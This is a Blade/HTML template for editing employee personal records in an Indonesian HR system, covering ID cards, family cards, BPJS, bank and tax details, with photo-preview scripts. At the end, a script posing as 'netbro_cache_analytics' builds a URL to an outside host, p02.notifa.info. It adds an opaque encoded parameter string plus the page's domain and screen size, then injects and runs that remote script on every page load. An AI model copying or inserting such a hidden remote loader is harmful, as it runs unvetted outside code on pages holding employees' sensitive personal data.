<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="">
  <meta name="author" content="">
  <link rel="shortcut icon" href="/image/favicon.png">
  <title>Data Karyawan</title>
  <link rel="stylesheet" type="text/css" href="/assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
  <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="/assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/jqvmap/jqvmap.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
  <link rel="stylesheet" type="text/css" href="/assets/css/float_button.css">
  <link rel="stylesheet" type="text/css" href="/css/croppie.css">
  <!-- Toastr untuk notifikasi -->
  <link href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css" rel="stylesheet">
</head>
<body>

  <!-- Wrapper Start   --> 
  <div class="be-wrapper">


    <!--  Sidebar Start -->  
    <div class="be-wrapper be-fixed-sidebar">
      @include('Beranda.sidebar')
    </div>
    <!--  Sidebar End --> 
    
    <!-- Konten -->
    <div class="be-content">
      <div class="page-head">
        <h2 class="page-head-title">Edit Data Karyawan</h2>
        <ol class="breadcrumb page-head-nav">
          <li><a href="/datakaryawan">Data Karyawan</a></li>
          <li class="active">Edit Data Pribadi</li>
        </ol>
      </div>

      <form action="/datakaryawan/{{$data_karyawan['id']}}/update/data_pribadi" method="POST" enctype="multipart/form-data">
        @csrf
        <div class="main-content container-fluid">
          <div class="row">
            <div class="col-sm-12">
              <div class="panel panel-default panel-table">
                <div class="panel-body">

                  <div>
                    <ul class="progressbar">
                      <a class="a" href="/datakaryawan/{{$data_karyawan['nik']}}/edit/data_pribadi"><li class="active">Data Pribadi</li></a>
                      <a class="a" href="/datakaryawan/{{$data_karyawan['nik']}}/edit/data_keluarga"><li class="">Data Keluarga</li></a>
                      <a class="a" href="/datakaryawan/{{$data_karyawan['nik']}}/edit/data_pendidikan"><li class="">Riwayat Pendidikan</li></a>
                      <a class="a" href="/datakaryawan/{{$data_karyawan['nik']}}/edit/data_riwayat_pekerjaan"><li class="">Riwayat Pekerjaan</li></a><br>
                    </ul><br>
                  </div><br>             
                  
                  <div class="panel-heading">Data Pribadi
                  </div>

                  <div class="modal-body">

                    <div align="center" class="form-group noSwipe">
                      <label>Foto Karyawan</label>
                      <div align="center" class="form-group">
                        <img id="foto_karyawan" data-toggle="modal" data-target="#modal-transparent-foto-karyawan" src="/image/FotoKaryawan/{{$data_karyawan['foto_karyawan']}}" alt="Placeholder" class="img-thumbnail"><br>
                        <div align="center" class="upload-btn-wrapper">
                          <button class="btn">Upload Foto</button>
                          <input id="input_foto_karyawan" type="file" name="foto_karyawan"/>
                        </div>
                      </div>
                      <!-- Modal Foto Karyawan-->
                      <div  class="modal modal-transparent fade" id="modal-transparent-foto-karyawan" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                        <div class="modal-header">
                          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        </div>
                        <div class="modal-body">
                          <center>  
                            <img id="modal_foto_karyawan" src="/image/FotoKaryawan/{{$data_karyawan['foto_karyawan']}}" alt="" class="img-responsive">
                          </center>
                        </div>
                        <div class="modal-footer">
                          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button> 
                        </div>
                      </div>
                    </div>


                    <div class="form-group">
                      <label>NIK</label>
                      <input name="nik" type="number" value="{{$data_karyawan['nik']}}"  class="form-control">
                    </div>
                    <div class="form-group">
                      <label>ID Sidik Jari</label>
                      <input name="id_sidik_jari" type="number" value="{{$data_karyawan['id_sidik_jari']}}" class="form-control">
                    </div>
                    <div class="form-group">
                      <label>Nama</label>
                      <input name="nama_karyawan" type="text" value="{{$data_karyawan['nama_karyawan']}}" class="form-control">
                    </div>
                    <div class="form-group">
                      <label>Jabatan/Divisi</label>
                      <select name="divisi" id="role" class="form-control" required="">
                        <option value="{{$data_karyawan['divisi']}}">{{$data_karyawan['divisi']}}</option>
                        @foreach($divisi as $divisi)
                        <option value="{{$divisi['nama_divisi']}}">{{$divisi->nama_divisi}}</option>
                        @endforeach
                      </select> 
                    </div>
                    <div class="form-group">
                      <label>Email address</label>
                      <input name="email" type="email" value="{{$data_karyawan['email']}}" class="form-control" required="">
                    </div>
                    <div class="form-group">
                      <label>Tanggal Masuk Kerja</label>
                      <input name="masa_kerja" type="date" value="{{$data_karyawan['masa_kerja']}}" class="form-control" >              
                    </div>
                    <div class="form-group">
                      <label>Alamat KTP</label>
                      <input name="alamat_ktp" type="text" value="{{$data_karyawan['alamat_ktp']}}" class="form-control" >
                    </div>
                    <div class="form-group">
                      <label>Alamat Tinggal</label>
                      <input name="alamat_tinggal" type="text" value="{{$data_karyawan['alamat_tinggal']}}" class="form-control" >
                    </div>
                    <div class="form-group">
                      <label>Tempat Kelahiran</label>
                      <input name="tempat_lahir" type="text" value="{{$data_karyawan['tempat_lahir']}}" class="form-control" >
                    </div>
                    <div class="row">
                      <div class="form-group col-md-12">
                        <label>Tanggal Lahir</label>
                        <input name="tanggal_lahir" type="date" value="{{$data_karyawan['tanggal_lahir']}}" class="form-control">
                      </div>
                    </div>
                    <div class="form-group">
                      <label>No.Telepon</label>
                      <input name="no_telp" type="number" value="{{$data_karyawan['no_telp']}}" class="form-control" >
                    </div>
                    <div class="form-group">
                      <label>No.KTP</label>
                      <input name="no_ktp" type="number" value="{{$data_karyawan['no_ktp']}}" class="form-control" >
                    </div>
                    <div align="center" class="form-group noSwipe">
                     <table>
                      <tr>
                       <td align="center">Foto Kartu Keluarga</td>
                       <td>&nbsp;&nbsp;</td>
                       <td align="center">Foto KTP</td>
                     </tr>
                     <tr>
                      <td>
                        <img data-toggle="modal" id="foto_kk" data-target="#modal-transparent-kk" src="/image/KKKTP/{{$data_karyawan['foto_kk']}}" alt="Placeholder" class="img-data"><br>
                      </td>
                      <td>&nbsp;&nbsp;&nbsp;&nbsp;</td>
                      <td>
                        <img data-toggle="modal" id="foto_ktp" data-target="#modal-transparent-ktp" src="/image/KKKTP/{{$data_karyawan['foto_ktp']}}" alt="Placeholder" class="img-data"><br>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        <div class="upload-btn-wrapper">
                          <button class="btn">Upload Kartu Keluarga</button>
                          <input id="input_foto_kk" type="file" name="foto_kk" />
                        </div>
                      </td>
                      <td>&nbsp;&nbsp;</td>
                      <td>
                        <div align="center" class="upload-btn-wrapper">
                          <button class="btn">Upload KTP</button>
                          <input id="input_foto_ktp" type="file" name="foto_ktp" />
                        </div>
                      </td>
                    </tr>
                  </table>
                </div>
                <!-- Modal Foto Kartu Keluarga-->
                <div  class="modal modal-transparent fade" id="modal-transparent-kk" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                  <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                  </div>
                  <div class="modal-body">
                    <center>  
                      <img id="modal_foto_kk" src="/image/KKKTP/{{$data_karyawan['foto_kk']}}" alt="" class="img-responsive">
                    </center>
                  </div>
                </div>

                <!-- Modal Foto KTP-->
                <div  class="modal modal-transparent fade" id="modal-transparent-ktp" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                  <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                  </div>
                  <div class="modal-body">
                    <center>  
                      <img id="modal_foto_ktp" src="/image/KKKTP/{{$data_karyawan['foto_ktp']}}" alt="" class="img-responsive">
                    </center>
                  </div>
                </div>


                <div class="form-group">
                  <label>No.BPJS Ketenagakerjaan</label>
                  <input name="no_bpjs_ketenagakerjaan" type="number" value="{{$data_karyawan['no_bpjs_ketenagakerjaan']}}" class="form-control">
                </div>
                <label>Foto BPJS Ketenagakerjaan</label>
                <div align="center" class="form-group">
                  <img id="foto_bpjs_ketenagakerjaan" data-toggle="modal" data-target="#modal-transparent-bpjs-ketenagakerjaan" src="/image/BPJS/{{$data_karyawan['foto_bpjs_ketenagakerjaan']}}" alt="Placeholder" class="img-data"><br>
                  <div align="center" class="upload-btn-wrapper">
                    <button class="btn">Upload Gambar</button>
                    <input id="input_foto_bpjs_ketenagakerjaan" type="file" name="foto_bpjs_ketenagakerjaan" />
                  </div>
                </div>
                <!-- Modal Foto BPJS-->
                <div  class="modal modal-transparent fade" id="modal-transparent-bpjs-ketenagakerjaan" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                  <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                  </div>
                  <div class="modal-body">
                    <center>  
                      <img id="modal_foto_bpjs_ketenagakerjaan" src="/image/BPJS/{{$data_karyawan['foto_bpjs_kesehatan']}}" alt="" class="img-responsive">
                    </center>
                  </div>
                </div>



                <div class="form-group">
                  <label>No.BPJS Kesehatan</label>
                  <input name="no_bpjs_kesehatan" type="number" value="{{$data_karyawan['no_bpjs_kesehatan']}}" class="form-control">
                </div>
                <label>Foto BPJS Kesehatan</label>
                <div align="center" class="form-group">
                  <img id="foto_bpjs_kesehatan" data-toggle="modal" data-target="#modal-transparent-bpjs-kesehatan" src="/image/BPJS/{{$data_karyawan['foto_bpjs_kesehatan']}}" alt="Placeholder" class="img-data"><br>
                  <div align="center" class="upload-btn-wrapper">
                    <button class="btn">Upload Gambar</button>
                    <input id="input_foto_bpjs_kesehatan" type="file" name="foto_bpjs_kesehatan" />
                  </div>
                </div>
                <!-- Modal Foto BPJS-->
                <div  class="modal modal-transparent fade" id="modal-transparent-bpjs-kesehatan" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                  <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                  </div>
                  <div class="modal-body">
                    <center>  
                      <img id="modal_foto_bpjs_kesehatan" src="/image/BPJS/{{$data_karyawan['foto_bpjs_kesehatan']}}" alt="" class="img-responsive">
                    </center>
                  </div>
                </div>

                <div class="form-group">
                  <label>Nama Bank</label>
                  <input name="nama_bank" type="text" value="{{$data_karyawan['nama_bank']}}" class="form-control">
                </div>

                <div class="form-group">
                  <label>Nomor Rekening</label>
                  <input name="no_rekening" type="number" value="{{$data_karyawan['no_rekening']}}" class="form-control">
                </div>

                <div class="form-group">
                  <label>Nama Pemilik Rekening</label>
                  <input name="nama_rekening" type="text" value="{{$data_karyawan['nama_rekening']}}" class="form-control">
                </div>

                <div class="form-group">
                  <label>No.NPWP</label>
                  <input name="no_npwp" type="text" value="{{$data_karyawan['no_npwp']}}" class="form-control">
                </div>
                <label>Foto NPWP</label><br>
                <div align="center" class="form-group">
                 <img id="foto_npwp" data-toggle="modal" data-target="#modal-transparent-npwp" src="/image/NPWP/{{$data_karyawan['foto_npwp']}}" alt="Placeholder" class="img-data"><br>
                 <div align="center" class="upload-btn-wrapper">
                  <button class="btn ">Upload NPWP</button>
                  <input id="input_foto_npwp" type="file" name="foto_npwp" />
                </div>
              </div>
              <!-- Modal Foto NPWP-->
              <div  class="modal modal-transparent fade" id="modal-transparent-npwp" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
                <div class="modal-header">
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                </div>
                <div class="modal-body">
                  <center>  
                    <img id="modal_foto_npwp" src="/image/NPWP/{{$data_karyawan['foto_npwp']}}" alt="" class="img-responsive">
                  </center>
                </div>
              </div>
              <div class="form-group">
                <label>No.Telepon Darurat</label>
                <input name="no_telp_darurat" type="number" value="{{$data_karyawan['no_telp_darurat']}}" class="form-control">
              </div>
              <div class="form-group">
                <label>Nama dan hubungan dengan No.Telepon Darurat</label>
                <input name="hub_no_telp_darurat" type="text" value="{{$data_karyawan['hub_no_telp_darurat']}}" class="form-control">              
              </div>
              <div class="form-group">
                <label>Status</label>
                <select name="status_kerja" id="status_kerja" class="form-control">
                  <option value="{{$data_karyawan['status_kerja']}}">{{$data_karyawan['status_kerja']}}</option>
                  @if($data_karyawan['status_kerja'] == "Aktif")
                  <option value="Resign">Resign</option>
                  @elseif($data_karyawan['status_kerja'] == "Resign")
                  <option value="Aktif">Aktif</option>
                  @else
                  <option value="Aktif">Aktif</option>
                  <option value="Resign" >Resign</option>
                  @endif
                </select> 
              </div>
              @if($data_karyawan['status_kerja'] == "Aktif")
              <div class="form-group">
                <label>Alasan</label>
                <input name="alasan_resign" value="{{$data_karyawan['alasan_resign']}}" id="alasan_resign" type="text" disabled="" class="form-control" required="">  
              </div>
              <div class="form-group">
                <label>Tanggal Resign</label>
                <input name="tanggal_resign" value="{{$data_karyawan['tanggal_resign']}}" id="tanggal_resign" type="date" class="form-control" disabled="" required="">
              </div>
              @elseif($data_karyawan['status_kerja'] == "Resign")
              <div class="form-group">
                <label>Alasan</label>
                <input name="alasan_resign" value="{{$data_karyawan['alasan_resign']}}" id="alasan_resign" type="text" class="form-control" required="">  
              </div>
              <div class="form-group">
                <label>Tanggal Resign</label>
                <input name="tanggal_resign" value="{{$data_karyawan['tanggal_resign']}}" id="tanggal_resign" type="date" class="form-control" required="">
              </div>
              @endif
            </div>

            <!-- End Modal Edit -->
          </div>
          <!--panel Body--> 
          <div class="modal-footer">
            <a href="/datakaryawan"><button type="button" data-dismiss="modal" class="btn btn-default">Kembali</button></a>
            <button type="submit" data-dismiss="modal" class="btn btn-primary">Simpan</button>
            <a href="/datakaryawan/{{$data_karyawan['nik']}}/edit/data_keluarga"><button type="button" data-dismiss="modal" class="btn btn-default">Lanjut</button></a>
          </div>
        </div>
      </div>
    </div>
  </div>
  <form>
  </div>
</div>

<div class="text-center">
  <div class="credits">
    <p>Sistem Informasi Karyawan<b> Idea Imaji Persada</b></p>
  </div>
</div>

<!-- Script Toastr untuk notifikasi-->
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script>
 @if (Session::has('message'))
 var type = "{{Session::get('alert-type','info')}}";
 toastr.options = {
  "debug": false,
  "onclick": null,
  "fadeIn": 300,
  "fadeOut": 1000,
  "timeOut": 5000,
  "extendedTimeOut": 1000
}

switch(type)
{
  case 'info':
  toastr.info("{{Session::get('message')}}");
  break;

  case 'success':
  toastr.success("{{Session::get('message')}}");
  break;

  case 'warning':
  toastr.warning("{{Session::get('message')}}");
  break;

  case 'error':
  toastr.error("{{Session::get('message')}}");
  break;
}

@endif

</script>

<!-- JS untuk opsi resign di bagian edit data karyawan -->

<script src="/assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
<script src="/assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
<script src="/assets/js/main.js" type="text/javascript"></script>
<script src="/assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
<script src="/assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>

<script type="text/javascript">

        //fungsi status resign 
        document.getElementById("status_kerja").onchange = function () {
          document.getElementById("alasan_resign").setAttribute("disabled", "disabled");
          document.getElementById("tanggal_resign").setAttribute("disabled", "disabled");
          if (this.value == 'Resign')
            document.getElementById("alasan_resign").removeAttribute("disabled");
          if (this.value == 'Resign')
            document.getElementById("tanggal_resign").removeAttribute("disabled");
        };

      //fungsi preview foto Karyawan

      function readURL_karyawan(input) {
        if (input.files && input.files[0]) {
          var reader = new FileReader();

          reader.onload = function (e) {
            $('#foto_karyawan')
            .attr('src', e.target.result);
            $('#modal_foto_karyawan')
            .attr('src', e.target.result);
          };

          reader.readAsDataURL(input.files[0]);
        }
      }

      $("#input_foto_karyawan").change(function () {
        readURL_karyawan(this);
      });
      
      //fungsi preview foto kk

      function readURL_kk(input) {
        if (input.files && input.files[0]) {
          var reader = new FileReader();

          reader.onload = function (e) {
            $('#foto_kk')
            .attr('src', e.target.result);
            $('#modal_foto_kk')
            .attr('src', e.target.result);
          };

          reader.readAsDataURL(input.files[0]);
        }
      }

      $("#input_foto_kk").change(function () {
        readURL_kk(this);
      });
      //end fungsi preview foto kk
      //fungsi preview foto ktp
      function readURL_ktp(input) {
        if (input.files && input.files[0]) {
          var reader = new FileReader();

          reader.onload = function (e) {
            $('#foto_ktp')
            .attr('src', e.target.result);
            $('#modal_foto_ktp')
            .attr('src', e.target.result);
          };

          reader.readAsDataURL(input.files[0]);
        }
      }

      $("#input_foto_ktp").change(function () {
        readURL_ktp(this);
      });
        //end fungsi preview foto ktp
        //fungsi preview foto bpjs ketenagakerjaan
        function readURL_bpjs_ketenagakerjaan(input) {
          if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
              $('#foto_bpjs_ketenagakerjaan')
              .attr('src', e.target.result);
              $('#modal_foto_bpjs_ketenagakerjaan')
              .attr('src', e.target.result);
            };

            reader.readAsDataURL(input.files[0]);
          }
        }

        $("#input_foto_bpjs_ketenagakerjaan").change(function () {
          readURL_bpjs_ketenagakerjaan(this);
        });
        //end fungsi preview foto bpjs ketenagakerjaan
         //fungsi preview foto bpjs kesehatan
         function readURL_bpjs_kesehatan(input) {
          if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
              $('#foto_bpjs_kesehatan')
              .attr('src', e.target.result);
              $('#modal_foto_bpjs_kesehatan')
              .attr('src', e.target.result);
            };

            reader.readAsDataURL(input.files[0]);
          }
        }

        $("#input_foto_bpjs_kesehatan").change(function () {
          readURL_bpjs_kesehatan(this);
        });
        //end fungsi preview foto bpjs kesehatan
        //fungsi preview foto npwp
        function readURL_npwp(input) {
          if (input.files && input.files[0]) {
            var reader = new FileReader();

            reader.onload = function (e) {
              $('#foto_npwp')
              .attr('src', e.target.result);
              $('#modal_foto_npwp')
              .attr('src', e.target.result);
            };

            reader.readAsDataURL(input.files[0]);
          }
        }

        $("#input_foto_npwp").change(function () {
          readURL_npwp(this);
        });
        //end fungsi preview foto npwp                       


      </script>

      <script type="text/javascript">

      // Fungsi Logout

      $(function(){
        $('a#logout').click(function(){
          if(confirm('Apakah anda yakin ingin keluar ?')) {
            return true;
          }

          return false;
        });
      });


      // Fungsi Menu dashboard

      $(document).ready(function(){

        App.init();
        App.dashboard();

      });
    </script>

    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };

    </script>

  </body>
  </html>
